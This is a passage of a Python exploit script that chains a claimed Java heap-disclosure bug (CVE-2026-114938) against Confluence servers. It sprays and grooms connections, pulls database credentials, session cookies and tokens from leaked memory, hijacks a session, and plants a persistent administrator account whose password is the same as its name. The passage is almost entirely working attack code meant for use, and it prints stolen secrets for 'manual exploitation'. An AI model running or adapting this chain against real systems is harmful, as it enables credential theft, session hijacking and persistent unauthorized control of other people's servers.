    if not access_info:
        timer.log("!", "No access credentials available")
        return False

    auth_headers = {"Content-Type": "application/json"}
    if access_info.get("cookie"):
        auth_headers["Cookie"] = access_info["cookie"]
    if access_info.get("auth_header"):
        auth_headers["Authorization"] = access_info["auth_header"]

    # Step 1: Create user
    # Confluence REST API v2 for user management
    user_payload = json.dumps({
        "userName": new_username,
        "password": new_username,
        "email": f"{new_username}@java4shell.local",
        "displayName": "Java4Shell Admin",
    })

    timer.log("+", "Creating user via REST API...")
    status, headers, body = http_post(
        base_url + CF_ADMIN_USER,
        user_payload,
        headers=auth_headers,
        timeout=10)

    if isinstance(status, int) and status in (200, 201):
        timer.log("+", f"User '{new_username}' created (HTTP {status})")
    elif isinstance(status, int) and status == 409:
        timer.log("~", f"User '{new_username}' already exists")
    elif isinstance(status, int) and status in (401, 403):
        timer.log("!", f"User creation denied: HTTP {status}")
        # Fallback: try via the web UI form
        timer.log("~", "Trying web UI form fallback...")
        form_data = urllib.parse.urlencode({
            "username": new_username,
            "fullName": "Java4Shell Admin",
            "email": f"{new_username}@java4shell.local",
            "password": new_username,
            "confirm": new_username,
        })
        form_headers = dict(auth_headers)
        form_headers["Content-Type"] = \
            "application/x-www-form-urlencoded"
        fs, _, _ = http_post(
            base_url + "/admin/users/docreateuser.action",
            form_data,
            headers=form_headers,
            timeout=10)
        if isinstance(fs, int) and fs in (200, 302):
            timer.log("+", f"User created via web form "
                           f"(HTTP {fs})")
        else:
            timer.log("!", f"Web form fallback failed: HTTP {fs}")
            return False
    else:
        timer.log("!", f"User creation failed: HTTP {status}")
        if body:
            timer.log("~", body.decode(errors="replace")[:200])
        return False

    # Step 2: Add to confluence-administrators group
    timer.log("+", "Adding to confluence-administrators group...")
    group_url = base_url + CF_ADMIN_GROUP_MEMBER.format(
        group="confluence-administrators")

    member_payload = json.dumps({"name": new_username})
    gs, _, gbody = http_put(
        group_url,
        member_payload,
        headers=auth_headers,
        timeout=10)

    if isinstance(gs, int) and gs in (200, 201, 204):
        timer.log("+", f"Added '{new_username}' to "
                       f"confluence-administrators")
    else:
        timer.log("~", f"Group assignment: HTTP {gs}")
        # Try POST instead of PUT
        gs2, _, _ = http_post(
            group_url,
            member_payload,
            headers=auth_headers,
            timeout=10)
        if isinstance(gs2, int) and gs2 < 300:
            timer.log("+", f"Added to group via POST "
                           f"(HTTP {gs2})")

    # Step 3: Verify login
    timer.log("+", "Verifying new admin login...")
    new_b64 = base64.b64encode(
        f"{new_username}:{new_username}".encode()).decode()
    vs, _, vbody = http_get(
        base_url + CF_CURRENT_USER,
        headers={"Authorization": f"Basic {new_b64}"},
        timeout=5)

    if isinstance(vs, int) and vs == 200 and vbody:
        try:
            user_data = json.loads(vbody)
            timer.log("+", f"{GREEN}New admin login verified "
                           f"/ {new_username}{NC}")
            return True
        except (json.JSONDecodeError, TypeError):
            pass

    timer.log("~", f"Login verification: HTTP {vs}")
    return True  # User may have been created even if verify fails


# ═══════════════════════════════════════════════════════════════
# Main chain orchestrator
# ═══════════════════════════════════════════════════════════════


def main():
    parser = argparse.ArgumentParser(
        description="Java4Shell Confluence Chain — CVE-2026-114938")
    parser.add_argument("--url", required=True,
                        help="Confluence base URL "
                             "(e.g. http://localhost:8090)")
    parser.add_argument("--creds", default="admin:admin",
                        help="Valid Basic Auth creds for warmup "
                             "(default: admin:admin)")
    parser.add_argument("--warmup", type=int, default=WARMUP_DEFAULT)
    parser.add_argument("--attempts", type=int, default=24,
                        help="Max groom attempts (default: 24)")
    parser.add_argument("--spray", type=int, default=GROOM_SPRAY_SIZE,
                        help="Connections per spray (default: 40)")
    parser.add_argument("--username", default="java4shell-admin",
                        help="Admin username to create "
                             "(default: java4shell-admin)")
    parser.add_argument("--jdk17", action="store_true",
                        help="Use JDK 17 trigger (129-byte payload)")
    args = parser.parse_args()

    creds_b64 = base64.b64encode(args.creds.encode()).decode()
    trigger_b64 = TRIGGER_B64_JDK17 if args.jdk17 else TRIGGER_B64
    timer = Timer()

    # ── Banner ──
    print()
    print(f"  {CYAN}╔═══════════════════════════════════════════════════════════╗{NC}")
    print(f"  {CYAN}║  Java4Shell Confluence Chain — CVE-2026-114938            ║{NC}")
    print(f"  {CYAN}║  RECON > WARM > GROOM > JAVABLEED > TAKEOVER > ADMIN     ║{NC}")
    print(f"  {CYAN}╚═══════════════════════════════════════════════════════════╝{NC}")
    print()
    print(f"  {WHITE}CONFLUENCE  //  {args.url}{NC}")
    print(f"  {DIM}SPRAY   {args.spray} x {args.attempts} attempts{NC}")
    if args.jdk17:
        print(f"  {YELLOW}TRIGGER JDK 17 mode (129-byte payload){NC}")
    print()

    milestones = {
        "db_creds": False,
        "session_hijack": False,
        "admin_access": False,
        "persistence": False,
    }

    # ── Phase 1: RECON ──
    cf_info = phase_recon(timer, args.url)
    if not cf_info:
        timer.log("!", "Confluence not reachable")
        return

    # ── Phase 2: WARM ──
    warm_ok, warm_rtts = phase_warm(timer, args.url, creds_b64,
                                     args.warmup)
    if warm_ok == 0:
        timer.log("!", "Warmup failed — check credentials")
        return

    # ── Phase 3: REHEARSE ──
    rehearsal_rtts = phase_rehearse(timer, args.url, creds_b64)
    avg_rtt = (sum(rehearsal_rtts) / len(rehearsal_rtts)
               if rehearsal_rtts else 1.0)

    # ── Phase 4+5: GROOM + TRIGGER ──
    leaked_data = phase_groom_trigger(
        timer, args.url, creds_b64,
        spray_size=args.spray,
        max_attempts=args.attempts,
        avg_rtt_ms=avg_rtt,
        trigger_b64=trigger_b64)

    if not leaked_data:
        timer.log("~", "No heap disclosure achieved")
        timer.log("~", "Possible causes:")
        timer.log("~", "  - CPU lacks AVX-512 VBMI (required)")
        timer.log("~", "  - JDK is patched")
        timer.log("~", "  - Heap layout never aligned "
                       "(increase --attempts)")
        _print_summary(timer, milestones)
        return

    # ── Phase 6: JAVABLEED ──
    secrets = find_confluence_secrets(timer, leaked_data)

    if secrets.get("db_credentials"):
        milestones["db_creds"] = True
    if secrets.get("session_cookies") or secrets.get("crowd_tokens"):
        milestones["session_hijack"] = True

    total_secrets = sum(len(v) for v in secrets.values())
    if total_secrets == 0:
        timer.log("~", "No exploitable secrets found in leaked data")
        _print_summary(timer, milestones)
        return

    # ── Phase 7: TAKEOVER ──
    access = phase_takeover(timer, args.url, secrets)

    if access:
        milestones["admin_access"] = True
        timer.log("+", f"{GREEN}Access via {access['method']}{NC} "
                       f"— user '{access['user']}'")

        # ── Phase 8: ADMIN ──
        admin_ok = phase_admin(timer, args.url, access,
                               args.username)
        if admin_ok:
            milestones["persistence"] = True
    else:
        timer.log("~", "Could not gain direct access")
        timer.log("~", "Leaked secrets dumped for manual "
                       "exploitation:")
        for cat, items in secrets.items():
            if items:
                for item in items[:3]:
                    val = (item.get("key_hex", "") or
                           item.get("value", "") or "")
                    timer.log("~", f"  [{cat}] {val[:64]}...")

    # ── Summary ──
    _print_summary(timer, milestones)


def _print_summary(timer, milestones):
    elapsed = timer.elapsed()

    print()
    access_level = "NONE"
    if milestones["persistence"]:
        access_level = "ADMIN + PERSISTENCE"
    elif milestones["admin_access"]:
        access_level = "ADMIN"
    elif milestones["session_hijack"]:
        access_level = "SESSION"
    elif milestones["db_creds"]:
        access_level = "DB CREDENTIALS"

    print(f"  ELAPSED   {timer.fmt(elapsed)}"
          f"          ACCESS  {access_level}")
    print(f"  ATTEMPTS  {timer.try_count:02d}")
    print()

    def ms(label, done):
        return (f"{GREEN}■ {label}{NC}" if done
                else f"{DIM}□ {label}{NC}")

    print(f"  {ms('DB CREDS', milestones['db_creds'])}    "
          f"{ms('SESSION HIJACK', milestones['session_hijack'])}    "
          f"{ms('ADMIN ACCESS', milestones['admin_access'])}    "
          f"{ms('PERSISTENCE', milestones['persistence'])}")
    print()


if __name__ == "__main__":
    main()
